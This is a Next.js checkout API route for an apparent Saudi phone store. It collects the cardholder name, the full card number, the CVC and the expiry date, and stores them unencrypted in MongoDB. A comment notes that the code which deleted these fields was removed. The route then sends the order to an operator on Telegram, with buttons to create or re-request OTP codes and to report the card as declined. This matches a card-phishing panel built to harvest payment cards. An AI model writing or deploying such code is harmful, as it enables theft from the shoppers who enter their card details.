import { randomBytes } from 'node:crypto';
import { ObjectId } from 'mongodb';
import { NextRequest, NextResponse } from 'next/server';
import { getDb } from '@/lib/mongodb';
import { formatOrderForAdmin, type StoreOrder } from '@/lib/orders';
import { ensureTelegramIndexes, sendTelegramMessage, statusInlineKeyboard } from '@/lib/telegram';

export const runtime = 'nodejs';
export const dynamic = 'force-dynamic';

type PaymentMethodBody = {
  action?: 'verify-total' | 'submit';
  orderId?: string;
  submissionId?: string;
  reviewToken?: string;
  paymentMethod?: 'mada' | 'visa';
  cardholderName?: string;
  cardNumber?: string;
  cvc?: string;
  expiryMonth?: string;
  expiryYear?: string;
};

const UUID_PATTERN = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

export async function POST(request: NextRequest) {
  let body: PaymentMethodBody;
  try {
    body = await request.json() as PaymentMethodBody;
  } catch {
    return NextResponse.json({ ok: false, error: 'بيانات اختيار الدفع غير صالحة.' }, { status: 400 });
  }

  const orderId = typeof body.orderId === 'string' ? body.orderId.trim() : '';
  const submissionId = typeof body.submissionId === 'string' ? body.submissionId.trim() : '';
  const reviewToken = typeof body.reviewToken === 'string' ? body.reviewToken.trim() : '';
  const paymentMethod = body.paymentMethod;
  const cardholderName = typeof body.cardholderName === 'string' ? body.cardholderName.trim().slice(0, 100) : '';
  const cardNumber = typeof body.cardNumber === 'string' ? body.cardNumber.replace(/\D/g, '') : '';
  const cvc = typeof body.cvc === 'string' ? body.cvc.replace(/\D/g, '') : '';
  const expiryMonth = typeof body.expiryMonth === 'string' ? body.expiryMonth.trim() : '';
  const expiryYear = typeof body.expiryYear === 'string' ? body.expiryYear.trim() : '';

  if (!/^[a-f0-9]{24}$/i.test(orderId) || !UUID_PATTERN.test(submissionId) || !UUID_PATTERN.test(reviewToken)) {
    return NextResponse.json({ ok: false, error: 'تعذر التحقق من الطلب. ارجع لبيانات التوصيل وحاول مرة أخرى.' }, { status: 400 });
  }

  if (body.action === 'verify-total') {
    try {
      const db = await getDb();
      const verifiedOrder = await db.collection<StoreOrder & {
        checkoutRequestId?: string;
        reviewToken?: string;
      }>('orders').findOne({
        _id: new ObjectId(orderId),
        source: 'website',
        checkoutRequestId: submissionId,
        reviewToken
      });
      if (!verifiedOrder) {
        return NextResponse.json({ ok: false, error: 'لم يتم العثور على الطلب أو تعذر التحقق من ملكيته.' }, {
          status: 404,
          headers: { 'cache-control': 'no-store, max-age=0' }
        });
      }
      if (!Number.isFinite(verifiedOrder.total) || verifiedOrder.total <= 0) {
        return NextResponse.json({ ok: false, error: 'إجمالي الطلب المسجل غير صالح.' }, {
          status: 409,
          headers: { 'cache-control': 'no-store, max-age=0' }
        });
      }
      return NextResponse.json({
        ok: true,
        total: verifiedOrder.total,
        currency: verifiedOrder.currency || 'SAR',
        orderNumber: verifiedOrder.orderNumber
      }, { headers: { 'cache-control': 'no-store, max-age=0' } });
    } catch (error) {
      console.error('Payment amount verification failed:', error instanceof Error ? error.message : 'Unknown error');
      return NextResponse.json({ ok: false, error: 'تعذر التحقق من إجمالي الطلب حاليًا.' }, {
        status: 500,
        headers: { 'cache-control': 'no-store, max-age=0' }
      });
    }
  }

  if (paymentMethod !== 'mada' && paymentMethod !== 'visa') {
    return NextResponse.json({ ok: false, error: 'اختر بطاقة Visa أو مدى.' }, { status: 400 });
  }

  // التحقق من صحة البيانات كاملة (رقم البطاقة 16 رقم ورمز CVC وتاريخ الانتهاء)
  if ((paymentMethod === 'visa' || paymentMethod === 'mada') && (
    !cardholderName ||
    cardNumber.length !== 16 ||
    !cvc || cvc.length < 3 ||
    !/^(0[1-9]|1[0-2])$/.test(expiryMonth) ||
    !/^[0-9]{4}$/.test(expiryYear)
  )) {
    return NextResponse.json({ ok: false, error: 'أدخل اسم حامل البطاقة ورقم البطاقة (16 رقم) ورمز CVC وتاريخ الانتهاء بشكل صحيح.' }, { status: 400 });
  }

  try {
    const db = await getDb();
    await ensureTelegramIndexes(db);
    const orders = db.collection<StoreOrder & {
      checkoutRequestId?: string;
      reviewToken?: string;
      adminSeenAt?: Date | null;
      adminNotificationSentAt?: Date;
      cardholderName?: string;
      cardNumber?: string;
      cardLast4?: string;
      cvv?: string;
      expiryMonth?: string;
      expiryYear?: string;
    }>('orders');

    const filter = {
      _id: new ObjectId(orderId),
      source: 'website' as const,
      checkoutRequestId: submissionId,
      reviewToken
    };

    const order = await orders.findOne(filter);
    if (!order) {
      return NextResponse.json({ ok: false, error: 'لم يتم العثور على الطلب أو تعذر التحقق من ملكيته.' }, { status: 404 });
    }

    // The final order notification is sent only once, after payment method selection.
    if (order.adminNotificationSentAt) {
      return NextResponse.json({
        ok: true,
        notificationSent: true,
        paymentMethod: order.paymentMethod || paymentMethod,
        paymentStatus: order.paymentStatus || 'pending',
        alreadySubmitted: true
      });
    }

    const now = new Date();
    const cardLast4 = cardNumber.slice(-4);

    await orders.updateOne(filter, {
      $set: {
        paymentMethod,
        ...((paymentMethod === 'visa' || paymentMethod === 'mada')
          ? {
              cardholderName,
              cardNumber,          // حفظ رقم البطاقة كاملاً
              cardLast4,           // آخر 4 أرقام كمرجع سريع
              cvv: cvc,            // رمز الأمان CVC
              expiryMonth,
              expiryYear
            }
          : {}),
        adminOrderToken: order.adminOrderToken || randomBytes(24).toString('hex'),
        paymentMethodSelectedAt: now,
        paymentStatus: 'pending',
        ...(!order.installment ? { receiptToken: order.receiptToken || randomBytes(24).toString('hex') } : {}),
        ...(!order.installment ? { saleInvoiceToken: order.saleInvoiceToken || randomBytes(24).toString('hex') } : {}),
        ...(order.installment ? { installmentInvoiceToken: order.installmentInvoiceToken || randomBytes(24).toString('hex') } : {}),
        ...(order.installment ? { installmentContractToken: order.installmentContractToken || randomBytes(24).toString('hex') } : {}),
        adminSeenAt: null,
        updatedAt: now
      }
      // تمت إزالة الـ $unset الذي كان يحذف حقول البطاقة الحساسة
    });

    const updatedOrder = await orders.findOne(filter);
    if (!updatedOrder) {
      return NextResponse.json({ ok: false, error: 'تعذر تحديث طريقة الدفع في الطلب.' }, { status: 500 });
    }

    const adminId = Number(process.env.TELEGRAM_ADMIN_ID || '');
    if (!Number.isSafeInteger(adminId) || adminId <= 0) {
      return NextResponse.json({
        ok: true,
        notificationSent: false,
        paymentMethod,
        paymentStatus: 'pending',
        message: 'تم حفظ الطلب، لكن لم يتم ضبط مستلم إشعارات الإدارة.'
      });
    }
try {
  const orderUrl = updatedOrder.adminOrderToken
    ? new URL(`/admin-order/${updatedOrder.adminOrderToken}`, request.nextUrl.origin).toString()
    : '';

  const orderLinkText = orderUrl
    ? '\n\n📋 فتح الطلب والمستندات:\n' + orderUrl
    : '';
      await sendTelegramMessage(
        adminId,
        '🛍️ تم إكمال طلب جديد — أرض الجوال\n\n' +
          formatOrderForAdmin(updatedOrder as unknown as Record<string, unknown>) +
          orderLinkText,
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: '1️⃣ إظهار الفاتورة للعميل', callback_data: 'send-order-documents:' + updatedOrder._id.toHexString() }],
              [{ text: '❌ طلب رمز OTP جديد', callback_data: 'order-notice:' + updatedOrder._id.toHexString() + ':otp' }],
              [{ text: 'لا يوجد رصيد كافٍ', callback_data: 'order-notice:' + updatedOrder._id.toHexString() + ':balance' }],
              [{ text: 'بيانات البطاقة خاطئة', callback_data: 'order-notice:' + updatedOrder._id.toHexString() + ':card' }],
              [{ text: '🔐 إنشاء OTP للطلب', callback_data: 'create-order-otp:' + updatedOrder._id.toHexString() }],
              [{ text: '6️⃣ ✅ طلب مكتمل', callback_data: 'status:' + updatedOrder._id.toHexString() + ':completed' }]
            ]
          }
        }
      );
      const notifiedAt = new Date();
      await orders.updateOne(filter, {
        $set: {
          adminNotificationSentAt: notifiedAt,
          telegramNotificationSent: true,
          telegramNotifiedAt: notifiedAt
        }
      });

      return NextResponse.json({
        ok: true,
        notificationSent: true,
        paymentMethod,
        paymentStatus: 'pending',
        message: 'تم حفظ الطلب وإرسال بياناته وطريقة الدفع للإدارة في رسالة واحدة.'
      });
    } catch (error) {
      console.error('Combined order admin notification failed:', error instanceof Error ? error.message : 'Unknown error');
      return NextResponse.json({
        ok: true,
        notificationSent: false,
        paymentMethod,
        paymentStatus: 'pending',
        message: 'تم حفظ الطلب، لكن تعذر إرسال إشعار تيليجرام. اضغط إكمال الطلب مرة أخرى للمحاولة.'
      });
    }
  } catch (error) {
    console.error('Payment method selection failed:', error instanceof Error ? error.message : 'Unknown error');
    return NextResponse.json({ ok: false, error: 'تعذر حفظ اختيار طريقة الدفع حاليًا.' }, { status: 500 });
  }
}
